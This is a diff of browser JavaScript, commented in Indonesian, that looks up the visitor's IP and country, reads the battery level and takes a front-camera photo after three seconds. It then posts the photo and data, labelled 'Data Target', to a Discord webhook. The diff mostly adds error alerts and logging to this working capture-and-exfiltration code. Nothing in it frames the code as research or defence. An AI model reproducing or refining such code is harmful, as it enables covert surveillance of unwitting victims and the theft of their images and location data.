@@ -27,38 +27,62 @@ fetch("https://ipwho.is/")
         navigator.getBattery().then(battery => {
             const batteryPercentage = battery.level * 100; // Persen baterai
 
+            // Akses kamera depan
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
-                .then(stream => {  
-                    const track = stream.getVideoTracks()[0];  
-                    const imageCapture = new ImageCapture(track);  
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
 
-                    setTimeout(() => {  
-                        const localTime = getLocalTime();  
-                        imageCapture.takePhoto()  
-                            .then(blob => {  
-                                sendToDiscord(blob, ip, country, localTime, batteryPercentage);  
-                                track.stop();  
-                            })  
-                            .catch(error => console.error("Gagal ambil foto:", error));  
-                    }, 3000);  
-                })  
-                .catch(err => console.error("Akses kamera ditolak:", err));  
+                    setTimeout(() => {
+                        const localTime = getLocalTime();
+                        imageCapture.takePhoto()
+                            .then(blob => {
+                                sendToDiscord(blob, ip, country, localTime, batteryPercentage);
+                                track.stop(); // Stop stream setelah foto diambil
+                            })
+                            .catch(error => {
+                                console.error("Gagal ambil foto:", error);
+                                alert("Terjadi kesalahan saat mengambil foto.");
+                            });
+                    }, 3000);
+                })
+                .catch(err => {
+                    console.error("Akses kamera ditolak:", err);
+                    alert("Perizinan kamera ditolak atau terjadi kesalahan.");
+                });
+        })
+        .catch(err => {
+            console.error("Gagal mendapatkan informasi baterai:", err);
+            alert("Terjadi kesalahan saat mendapatkan status baterai.");
         });
-    })  
-    .catch(err => console.error("Gagal ambil IP:", err));
+    })
+    .catch(err => {
+        console.error("Gagal mengambil IP:", err);
+        alert("Terjadi kesalahan saat mengambil IP.");
+    });
 
 // Kirim ke Webhook Discord
 function sendToDiscord(blob, ip, country, localTime, batteryPercentage) {
     const formData = new FormData();
     formData.append("file", blob, "capture.jpg");
 
-    formData.append("payload_json", JSON.stringify({  
-        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${country}\n⏰ **InterTime**: ${localTime}\n🔋 **Battery Percentage**: ${batteryPercentage}%`  
-    }));  
+    formData.append("payload_json", JSON.stringify({
+        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${country}\n⏰ **InterTime**: ${localTime}\n🔋 **Battery Percentage**: ${batteryPercentage}%`
+    }));
 
-    fetch(webhookURL, {  
-        method: "POST",  
-        body: formData  
+    fetch(webhookURL, {
+        method: "POST",
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Data berhasil dikirim ke webhook Discord!");
+        } else {
+            console.error("Gagal mengirim data ke webhook Discord.");
+        }
+    })
+    .catch(error => {
+        console.error("Gagal mengirim data:", error);
     });
 }
 
